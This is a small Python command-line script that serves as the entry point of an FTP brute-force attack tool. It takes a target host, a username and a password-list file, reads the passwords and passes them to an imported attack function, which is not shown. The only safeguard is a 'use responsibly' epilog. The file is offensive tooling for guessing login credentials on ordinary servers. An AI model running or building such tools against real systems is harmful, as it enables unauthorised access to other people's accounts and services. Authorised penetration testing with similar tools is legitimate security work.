import argparse
from protocols import ftp_brute

def main():
    parser = argparse.ArgumentParser(
        description="Brute force attack script for various protocols.",
        epilog="Use responsibly and only with explicit permission."
    )
    parser.add_argument(
        'protocol',
        choices=['ftp'],
        help="The protocol to attack (ftp)."
    )
    parser.add_argument(
        'target',
        help="Target IP or URL."
    )
    parser.add_argument(
        'user',
        help="Username."
    )
    parser.add_argument(
        'password_file',
        help="File with list of passwords."
    )
    parser.add_argument(
        '--threads', type=int, default=4, help="Number of threads to use (default: 4)."
    )

    args = parser.parse_args()

    with open(args.password_file, 'r') as f:
        passwords = [line.strip() for line in f]

    if args.protocol == 'ftp':
        ftp_brute.attack(args.target, args.user, passwords)

if __name__ == "__main__":
    main()